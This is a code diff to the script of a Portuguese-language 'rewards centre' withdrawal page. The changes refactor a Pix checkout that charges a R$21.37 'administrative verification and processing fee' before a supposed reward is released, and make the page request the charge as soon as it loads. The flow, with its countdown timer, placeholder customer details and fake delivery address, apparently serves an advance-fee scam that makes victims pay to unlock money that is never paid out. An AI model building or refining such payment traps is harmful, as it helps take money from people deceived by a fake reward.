@@ -2418,6 +2418,9 @@
     let isGeneratingPix = false;
     let isSubmittingWithdraw = false;
     let hasGeneratedPix = false;
+    let pixPaymentData = null;
+    let pixGenerationPromise = null;
+    let pixGenerationError = null;
     let paymentTimerInterval = null;
     let paymentTimeLeft = 300;
     let withdrawExpireInterval = null;
@@ -2878,30 +2881,86 @@
       return `${Date.now()}-${Math.random().toString(16).slice(2)}`;
     }
 
+    function getCheckoutPayload() {
+      return {
+        idempotencyKey: withdrawalData.checkoutKey,
+        items: [
+          {
+            title: "Taxa administrativa de verificacao e processamento",
+            unitPrice: 21.37,
+            quantity: 1,
+          },
+        ],
+        customer: {
+          name: withdrawalData.name || "Cliente Central de Recompensas",
+          cpf: withdrawalData.document,
+          email: withdrawalData.email || "cliente@central.local",
+          phone: withdrawalData.phone || "21999999999",
+        },
+        delivery: {
+          address: "Rua Pix",
+          number: "100",
+          neighborhood: "Centro",
+          city: "Rio de Janeiro",
+          state: "RJ",
+          zip_code: "20000000",
+        },
+      };
+    }
+
     function resetPixGeneration() {
       isGeneratingPix = false;
       hasGeneratedPix = false;
+      pixPaymentData = null;
+      pixGenerationPromise = null;
+      pixGenerationError = null;
       pixResult.classList.remove("visible");
       pixCode.value = "";
       pixQrWrap.classList.remove("visible");
+      pixQrImage.removeAttribute("src");
       setPixStatus("");
       setGenerateError("");
     }
 
-    async function generatePixPayment() {
-      if (isGeneratingPix) return;
-
-      if (hasGeneratedPix && pixCode.value) {
-        setPixStatus("Pix ja gerado. Use o codigo exibido abaixo.", "success");
-        return;
-      }
-
-      isGeneratingPix = true;
-      pixResult.classList.add("visible");
-      setGenerateError("");
+    function resetPixDisplay() {
+      pixResult.classList.remove("visible");
       pixCode.value = "";
       pixQrWrap.classList.remove("visible");
-      setPixStatus("Gerando Pix automaticamente...", "success");
+      pixQrImage.removeAttribute("src");
+      setPixStatus("");
+      setGenerateError("");
+    }
+
+    function renderPixPayment(data) {
+      const generatedPixCode = getPixCodeFromResponse(data);
+
+      if (!generatedPixCode) {
+        throw new Error("A API nao retornou o codigo Pix copia e cola.");
+      }
+
+      pixCode.value = generatedPixCode;
+      pixResult.classList.add("visible");
+      pixQrWrap.classList.remove("visible");
+
+      const qrImage = getQrImageSource({
+        base64: getPixQrBase64FromResponse(data),
+        pixCode: generatedPixCode,
+      });
+
+      if (qrImage) {
+        pixQrImage.onerror = () => {
+          pixQrWrap.classList.remove("visible");
+          setPixStatus("Pix gerado. Copie o codigo abaixo para pagar.", "success");
+        };
+        pixQrImage.src = qrImage;
+        pixQrWrap.classList.add("visible");
+      }
+
+      setPixStatus("Pix gerado. Copie o codigo ou escaneie o QR Code.", "success");
+    }
+
+    async function requestPixPayment() {
+      isGeneratingPix = true;
 
       try {
         const response = await fetch("/api/payments/checkout", {
@@ -2909,30 +2968,7 @@
           headers: {
             "Content-Type": "application/json",
           },
-          body: JSON.stringify({
-            idempotencyKey: withdrawalData.checkoutKey,
-            items: [
-              {
-                title: "Taxa administrativa de verificacao e processamento",
-                unitPrice: 21.37,
-                quantity: 1,
-              },
-            ],
-            customer: {
-              name: withdrawalData.name || "Cliente Central de Recompensas",
-              cpf: withdrawalData.document,
-              email: withdrawalData.email || "cliente@central.local",
-              phone: withdrawalData.phone || "21999999999",
-            },
-            delivery: {
-              address: "Rua Pix",
-              number: "100",
-              neighborhood: "Centro",
-              city: "Rio de Janeiro",
-              state: "RJ",
-              zip_code: "20000000",
-            },
-          }),
+          body: JSON.stringify(getCheckoutPayload()),
         });
 
         const data = await response.json();
@@ -2947,29 +2983,67 @@
           throw new Error("A API nao retornou o codigo Pix copia e cola.");
         }
 
-        pixCode.value = generatedPixCode;
+        pixPaymentData = data;
         hasGeneratedPix = true;
+        pixGenerationError = null;
+        return data;
+      } catch (error) {
+        pixPaymentData = null;
+        hasGeneratedPix = false;
+        pixGenerationError = error;
+        throw error;
+      } finally {
+        isGeneratingPix = false;
+      }
+    }
 
-        const qrImage = getQrImageSource({
-          base64: getPixQrBase64FromResponse(data),
-          pixCode: generatedPixCode,
-        });
+    function preloadPixPayment() {
+      if (pixGenerationPromise || pixPaymentData) {
+        return pixGenerationPromise || Promise.resolve(pixPaymentData);
+      }
 
-        if (qrImage) {
-          pixQrImage.onerror = () => {
-            pixQrWrap.classList.remove("visible");
-            setPixStatus("Pix gerado. Copie o codigo abaixo para pagar.", "success");
-          };
-          pixQrImage.src = qrImage;
-          pixQrWrap.classList.add("visible");
+      if (!withdrawalData.checkoutKey) {
+        withdrawalData.checkoutKey = createCheckoutKey();
+      }
+
+      pixGenerationPromise = requestPixPayment().finally(() => {
+        pixGenerationPromise = null;
+      });
+
+      return pixGenerationPromise;
+    }
+
+    async function generatePixPayment() {
+      if (pixPaymentData) {
+        renderPixPayment(pixPaymentData);
+        return;
+      }
+
+      if (pixGenerationPromise) {
+        pixResult.classList.add("visible");
+        setGenerateError("");
+        setPixStatus("Finalizando Pix...", "success");
+
+        try {
+          renderPixPayment(await pixGenerationPromise);
+        } catch (error) {
+          setGenerateError(getFriendlyPixError(error));
+          setPixStatus("");
         }
+        return;
+      }
 
-        setPixStatus("Pix gerado. Copie o codigo ou escaneie o QR Code.", "success");
+      pixResult.classList.add("visible");
+      setGenerateError("");
+      pixCode.value = "";
+      pixQrWrap.classList.remove("visible");
+      setPixStatus("Gerando Pix automaticamente...", "success");
+
+      try {
+        renderPixPayment(await preloadPixPayment());
       } catch (error) {
         setGenerateError(getFriendlyPixError(error));
         setPixStatus("");
-      } finally {
-        isGeneratingPix = false;
       }
     }
 
@@ -3071,13 +3145,13 @@
       withdrawalData.document = pixType === "cpf" ? pixKey.replace(/\D/g, "") : "";
       withdrawalData.email = pixType === "email" ? pixKey : "";
       withdrawalData.phone = pixType === "telefone" ? pixKey.replace(/\D/g, "") : "";
-      withdrawalData.checkoutKey = createCheckoutKey();
+      withdrawalData.checkoutKey = withdrawalData.checkoutKey || createCheckoutKey();
 
       reviewName.textContent = withdrawalData.name;
       setReviewDate();
       reviewPix.textContent = pixKey;
 
-      resetPixGeneration();
+      resetPixDisplay();
       updateStepBanner();
       showScreen(loadingScreen);
 
@@ -3152,6 +3226,7 @@
     updatePixKeyField();
     validateWithdrawForm();
     loadFooterImages();
+    preloadPixPayment().catch(() => {});
 </script>
 </body>
 </html>
